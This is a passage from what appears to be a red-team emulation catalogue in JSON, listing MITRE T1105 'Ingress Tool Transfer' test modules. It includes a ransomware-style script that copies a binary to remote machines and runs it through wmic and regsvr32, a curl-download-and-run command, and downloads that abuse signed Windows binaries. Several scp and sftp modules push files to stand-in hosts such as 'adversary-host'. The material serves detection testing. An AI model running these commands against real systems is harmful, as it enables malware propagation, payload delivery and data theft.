        "command": "$machine_list = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n",
        "elevation_required": false,
        "cleanup_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "binary_file",
          "description": "Binary file to copy to remote machines",
          "type": "string",
          "default_value": "$env:comspec"
        },
        {
          "name": "exe_remote_folder",
          "description": "Path to store executable on remote machine (no drive letter)",
          "type": "string",
          "default_value": "\\Windows\\Temp\\T1105.exe"
        },
        {
          "name": "remote_drive_letter",
          "description": "Remote drive letter",
          "type": "string",
          "default_value": "C"
        }
      ],
      "prerequisites": [
        {
          "description": "Binary file must exist at specified location (#{binary_file})\n",
          "check_command": "if (Test-Path #{binary_file}) {exit 0} else {exit 1}\n",
          "install_command": "write-host \"The binary_file input parameter must be set to a binary that exists on this computer.\"\n"
        },
        {
          "description": "Machine list must exist at specified location (\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105MachineList.txt\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nnew-item -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105MachineList.txt\" | Out-Null\necho \"A machine list file has been generated at \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1105MachineList.txt\". Please enter the machines to target there, one machine per line.\"\n"
        }
      ],
      "rx_module_id": "70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf",
      "module_name": "MAZE Propagation Script"
    },
    {
      "index": 656,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Create a ZIP file from a folder in a remote drive\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE\n",
        "elevation_required": false,
        "cleanup_command": "del %TEMP%\\PrintBrm.zip >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "Path_unc",
          "description": "Path to the UNC folder",
          "type": "path",
          "default_value": "\\\\127.0.0.1\\c$\\RAGLOXRedTeam\\rx_modules\\T1105\\src\\"
        },
        {
          "name": "Path_PrintBrm",
          "description": "Path to PrintBrm.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "49845fc1-7961-4590-a0f0-3dbcf065ae7e",
      "module_name": "Printer Migration Command-Line Tool UNC share folder into a zip file"
    },
    {
      "index": 657,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} \"#{replace_cab}\" %TEMP% /A\n",
        "elevation_required": false,
        "cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "replace_cab",
          "description": "Path to the cab file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1105\\src\\redcanary.cab"
        },
        {
          "name": "Path_replace",
          "description": "Path to replace.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\replace.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "#{replace_cab} must exist on system.\n",
          "check_command": "if (Test-Path \"#{replace_cab}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{replace_cab}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1105/src/redcanary.cab\" -OutFile \"#{replace_cab}\"\n"
        }
      ],
      "rx_module_id": "54782d65-12f0-47a5-b4c1-b70ee23de6df",
      "module_name": "Lolbas replace.exe use to copy file"
    },
    {
      "index": 658,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n",
        "elevation_required": false,
        "cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "replace_cab",
          "description": "UNC Path to the cab file",
          "type": "path",
          "default_value": "\\\\127.0.0.1\\c$\\RAGLOXRedTeam\\rx_modules\\T1105\\src\\redcanary.cab"
        },
        {
          "name": "Path_replace",
          "description": "Path to replace.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\replace.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ed0335ac-0354-400c-8148-f6151d20035a",
      "module_name": "Lolbas replace.exe use to copy UNC file"
    },
    {
      "index": 659,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use certreq to download a file from the web",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}",
        "elevation_required": false,
        "cleanup_command": "del #{local_path} >nul 2>&1"
      },
      "variables": [
        {
          "name": "local_path",
          "description": "Local path to place file",
          "type": "string",
          "default_value": "%temp%\\RAGLOX-license.txt"
        },
        {
          "name": "remote_file",
          "description": "URL of file to copy",
          "type": "url",
          "default_value": "https://example.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6fdaae87-c05b-42f8-842e-991a74e8376b",
      "module_name": "certreq download"
    },
    {
      "index": 660,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use wscript to run a local VisualBasic file to download a remote file",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wscript.exe \"#{vbscript_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "del RAGLOX-License.txt >nul 2>&1"
      },
      "variables": [
        {
          "name": "vbscript_file",
          "description": "Full path to the VisualBasic downloading the file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1105\\src\\T1105-download-file.vbs"
        }
      ],
      "prerequisites": [
        {
          "description": "#{vbscript_file} must be exist on system.\n",
          "check_command": "if (Test-Path \"#{vbscript_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{vbscript_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1105/src/T1105-download-file.vbs\" -OutFile \"#{vbscript_file}\"\n"
        }
      ],
      "rx_module_id": "97116a3f-efac-4b26-8336-b9cb18c45188",
      "module_name": "Download a file using wscript"
    },
    {
      "index": 661,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{payload_name}\n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "url of remote payload",
          "type": "string",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1105/src/raglox.sh"
        },
        {
          "name": "payload_name",
          "description": "payload name",
          "type": "string",
          "default_value": "raglox.sh"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3",
      "module_name": "Linux Download File and Run"
    },
    {
      "index": 662,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use nimgrab.exe to download a file from the web. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmd /c \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nimgrab.exe\" #{remote_file} #{destination_path}\n",
        "elevation_required": false,
        "cleanup_command": "del #{destination_path} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of file to copy",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "destination_path",
          "description": "Destination path to file",
          "type": "path",
          "default_value": "$env:TEMP\\RAGLOX-license.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "NimGrab must be installed on system.\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nimgrab.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://nim-lang.org/download/nim-1.6.6_x64.zip\" -Outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nim.zip\"\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nim.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nim\" -Force\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nim\\nim-1.6.6\\bin\\nimgrab.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nimgrab.exe\"\n"
        }
      ],
      "rx_module_id": "b1729c57-9384-4d1c-9b99-9b220afb384e",
      "module_name": "Nimgrab - Transfer Files"
    },
    {
      "index": 663,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}\n",
        "elevation_required": true,
        "cleanup_command": "del %temp%\\RAGLOX-license.txt >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of file to copy",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "local_path",
          "description": "Local path to place file",
          "type": "path",
          "default_value": "%temp%\\RAGLOX-license.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c01cad7f-7a4c-49df-985e-b190dcf6a279",
      "module_name": "iwr or Invoke Web-Request download"
    },
    {
      "index": 664,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.\n[Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)\nUpon execution, a sample zip file will be downloaded to C:\\Temp\\Sample folder",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir \"c:\\Temp\"\ncd #{working_dir}\nGUP.exe -unzipTo \"\" \"C:\\Temp\" \"Sample #{target_file_url} #{target_file_sha256}\"",
        "elevation_required": true,
        "cleanup_command": "rmdir /s /q \"C:\\Temp\\Sample\" >nul 2>nul"
      },
      "variables": [
        {
          "name": "target_file_url",
          "description": "URL of the target ZIP file (Eg: https://example.com/test.zip)",
          "type": "url",
          "default_value": "https://getsamplefiles.com/download/zip/sample-2.zip"
        },
        {
          "name": "working_dir",
          "description": "The directory where GUP.exe & it's dependecies exists",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1105\\bin\\"
        },
        {
          "name": "gup_executable",
          "description": "GUP is an open source signed binary used by Notepad++ for software updates",
          "type": "String",
          "default_value": "PathToRagloxModulesFolder\\T1105\\bin\\GUP.exe"
        },
        {
          "name": "target_file_sha256",
          "description": "SHA256 value of target ZIP file",
          "type": "string",
          "default_value": "CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
        }
      ],
      "prerequisites": [
        {
          "description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})",
          "check_command": "if (Test-Path \"#{gup_executable}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory (split-path \"#{gup_executable}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1105/bin/GUP.exe\" -OutFile \"#{gup_executable}\""
        }
      ],
      "rx_module_id": "66ee226e-64cb-4dae-80e3-5bf5763e4a51",
      "module_name": "Arbitrary file download using the Notepad++ GUP.exe binary"
    },
    {
      "index": 665,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use nscurl to download and write a file/payload from the internet.\n-k = Disable certificate checking\n-o = Output destination\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "nscurl -k \"#{remote_file}\" -o \"#{destination_path}\"",
        "elevation_required": false,
        "cleanup_command": "rm \"#{destination_path}\""
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of remote file to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "destination_path",
          "description": "Local path to place remote file",
          "type": "path",
          "default_value": "license.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5bcefe5f-3f30-4f1c-a61a-8d7db3f4450c",
      "module_name": "File download via nscurl"
    },
    {
      "index": 666,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers\nThis RAGLOX will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "sqlcmd -i #{remote_url} -o #{local_file_path}",
        "elevation_required": true,
        "cleanup_command": "rm \"#{local_file_path}\" 2>$null | Out-Null"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "URL of the C2 Server from where file/s need to be downloaded",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1105/src/T1105.zip"
        },
        {
          "name": "local_file_path",
          "description": "The local file path along with filename to where the file needs to be downloaded and placed.",
          "type": "path",
          "default_value": "C:\\T1105.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "Windows package 'Sqlcmd' need to be available in the machine to execute this raglox successfully",
          "check_command": "if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}",
          "install_command": "winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null"
        }
      ],
      "rx_module_id": "6934c16e-0b3a-4e7f-ab8c-c414acd32181",
      "module_name": "File Download with Sqlcmd.exe"
    },
    {
      "index": 667,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Copy a staged file using PSCP.exe to a public target location.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576\necho y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}\n",
        "elevation_required": false,
        "cleanup_command": "del /f /q #{exfil_package}\n"
      },
      "variables": [
        {
          "name": "pscp_url",
          "description": "pscp.exe download path",
          "type": "string",
          "default_value": "https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe"
        },
        {
          "name": "pscp_binary",
          "description": "PSCP binary location",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\pscp.exe"
        },
        {
          "name": "scp_user",
          "description": "Username of the SCP user",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "scp_password",
          "description": "Password for the SCP User",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "scp_port",
          "description": "port for the remote server",
          "type": "string",
          "default_value": "22"
        },
        {
          "name": "exfil_package",
          "description": "path to exfil package",
          "type": "path",
          "default_value": "C:\\Temp\\T1105_scp.zip"
        },
        {
          "name": "target_location",
          "description": "Remote location where the data will be copied to.",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "target_filename",
          "description": "Filename on the destination.",
          "type": "string",
          "default_value": "T1105_scp.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "pscp.exe must be available on the system.\n",
          "check_command": "if (Test-Path #{pscp_binary}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"#{pscp_url}\" -Outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\pscp.exe\"\n"
        }
      ],
      "rx_module_id": "c82b1e60-c549-406f-9b00-0a8ae31c9cfe",
      "module_name": "Remote File Copy using PSCP"
    },
    {
      "index": 668,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "This test simulates pushing files using SCP on a Windows environment.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"#{local_path}\"\nif (-Not (Test-Path -Path $folderPath)) {\n    New-Item -Path $folderPath -ItemType Directory\n}\n\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"#{file_name}\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n\n# Attack command\nscp.exe #{local_path}\\#{file_name} #{username}@#{remote_host}:#{remote_path}\n",
        "elevation_required": true,
        "cleanup_command": "$filePath = Join-Path -Path \"#{local_path}\" -ChildPath \"#{file_name}\"\nRemove-Item -Path $filePath -Force -erroraction silentlycontinue\nWrite-Output \"File deleted: $filePath\"\n"
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Path of folder to copy",
          "type": "path",
          "default_value": "/tmp/"
        },
        {
          "name": "remote_host",
          "description": "Remote host to send",
          "type": "string",
          "default_value": "adversary-host"
        },
        {
          "name": "local_path",
          "description": "Local path to copy from",
          "type": "path",
          "default_value": "C:\\temp"
        },
        {
          "name": "file_name",
          "description": "Name of the file to transfer",
          "type": "string",
          "default_value": "T1105.txt"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "adversary"
        }
      ],
      "prerequisites": [
        {
          "description": "This test requires the `scp` command to be available on the system.\n",
          "check_command": "if (Get-Command scp -ErrorAction SilentlyContinue) {\n    Write-Output \"SCP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SCP command is not available.\"\n    exit 1\n}\n",
          "install_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
        }
      ],
      "rx_module_id": "2a4b0d29-e5dd-4b66-b729-07423ba1cd9d",
      "module_name": "Windows push file using scp.exe"
    },
    {
      "index": 669,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "This test simulates pulling files using SCP on a Windows environment.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Path of folder to pull",
          "type": "path",
          "default_value": "/tmp/T1105.txt"
        },
        {
          "name": "remote_host",
          "description": "Remote host to pull from",
          "type": "string",
          "default_value": "adversary-host"
        },
        {
          "name": "local_path",
          "description": "Local path to receive files",
          "type": "path",
          "default_value": "C:\\temp"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "adversary"
        }
      ],
      "prerequisites": [
        {
          "description": "This test requires the `scp` command to be available on the system.\n",
          "check_command": "if (Get-Command scp -ErrorAction SilentlyContinue) {\n    Write-Output \"SCP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SCP command is not available.\"\n    exit 1\n}\n",
          "install_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
        }
      ],
      "rx_module_id": "401667dc-05a6-4da0-a2a7-acfe4819559c",
      "module_name": "Windows pull file using scp.exe"
    },
    {
      "index": 670,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "This test simulates pushing files using SFTP on a Windows environment.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"#{local_path}\"\nif (-Not (Test-Path -Path $folderPath)) {\n    New-Item -Path $folderPath -ItemType Directory\n}\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"#{file_name}\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n# Attack command\necho \"put #{local_path}\\#{file_name}\" | sftp #{username}@#{remote_host}:#{remote_path}\n",
        "elevation_required": true,
        "cleanup_command": "$filePath = Join-Path -Path \"#{local_path}\" -ChildPath \"#{file_name}\"\nRemove-Item -Path $filePath -Force\nWrite-Output \"File deleted: $filePath\"\n"
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Path of folder to copy",
          "type": "path",
          "default_value": "/tmp"
        },
        {
          "name": "remote_host",
          "description": "Remote host to send",
          "type": "string",
          "default_value": "adversary-host"
        },
        {
          "name": "local_path",
          "description": "Local path to receive sftp",
          "type": "path",
          "default_value": "C:\\temp"
        },
        {
          "name": "file_name",
          "description": "Name of the file to transfer",
          "type": "string",
          "default_value": "T1105.txt"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "adversary"
        }
      ],
      "prerequisites": [
        {
          "description": "This test requires the `sftp` command to be available on the system.\n",
          "check_command": "if (Get-Command sftp -ErrorAction SilentlyContinue) {\n    Write-Output \"SFTP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SFTP command is not available.\"\n    exit 1\n}\n",
          "install_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
        }
      ],
      "rx_module_id": "205e676e-0401-4bae-83a5-94b8c5daeb22",
      "module_name": "Windows push file using sftp.exe"
    },
    {
      "index": 671,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "This test simulates pulling files using SFTP on a Windows environment.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Path of file to pull",
          "type": "path",
          "default_value": "/tmp/T1105.txt"
        },
        {
          "name": "remote_host",
          "description": "Remote host to pull from",
          "type": "string",
          "default_value": "adversary-host"
        },
        {
          "name": "local_path",
          "description": "Local path to receive files",
          "type": "path",
          "default_value": "C:\\temp"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "adversary"
        }
      ],
      "prerequisites": [
        {
          "description": "This test requires the `sftp` command to be available on the system.\n",
          "check_command": "if (Get-Command sftp -ErrorAction SilentlyContinue) {\n    Write-Output \"SFTP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SFTP command is not available.\"\n    exit 1\n}\n",
          "install_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
        }
      ],
      "rx_module_id": "3d25f1f2-55cb-4a41-a523-d17ad4cfba19",
      "module_name": "Windows pull file using sftp.exe"
    },
    {
      "index": 672,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Uses OneDrive Standalone Updater to download a file from a specified URL by setting up the required registry keys.\nThis technique can be used to download files without executing anomalous executables.\nReference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (-not (Test-Path \"#{onedrive_path}\")) {\n    Write-Host \"OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Test cannot continue.\"\n    exit 1\n}\n\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Force | Out-Null\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateRingSettingURLFromOC\" -Value \"#{remote_url}\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"ODSUUpdateXMLUrlFromOC\" -Value \"#{remote_url}\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateXMLUrlFromOC\" -Value \"#{remote_url}\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateOfficeConfigTimestamp\" -Value 99999999999 -Type QWord -Force\n\n# Run OneDrive Standalone Updater\n& \"#{onedrive_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$env:LOCALAPPDATA\\Microsoft\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "URL to download file from",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "onedrive_path",
          "description": "Path to OneDrive Standalone Updater executable",
          "type": "path",
          "default_value": "C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "OneDriveStandaloneUpdater.exe must exist on disk at specified location\n",
          "check_command": "if (Test-Path \"#{onedrive_path}\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host \"OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Please install OneDrive or specify correct path.\"\n"
        }
      ],
      "rx_module_id": "3dd6a6cf-9c78-462c-bd75-e9b54fc8925b",
      "module_name": "Download a file with OneDrive Standalone Updater"
    },
    {
      "index": 673,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Launches an Ubuntu pod, installs curl, and executes curl with insecure flags (-k/--insecure)\nagainst a target URL. The pod is automatically deleted after execution.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- curl -ksL #{remote_url}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "pod_name",
          "description": "K8s pod_name to execute the command in",
          "type": "string",
          "default_value": "raglox-insecure-curl"
        },
        {
          "name": "remote_url",
          "description": "Remote URL to curl",
          "type": "string",
          "default_value": "https://malicious-apt.com"
        },
        {
          "name": "image_name",
          "description": "Name of the docker image",
          "type": "string",
          "default_value": "curlimages/curl"
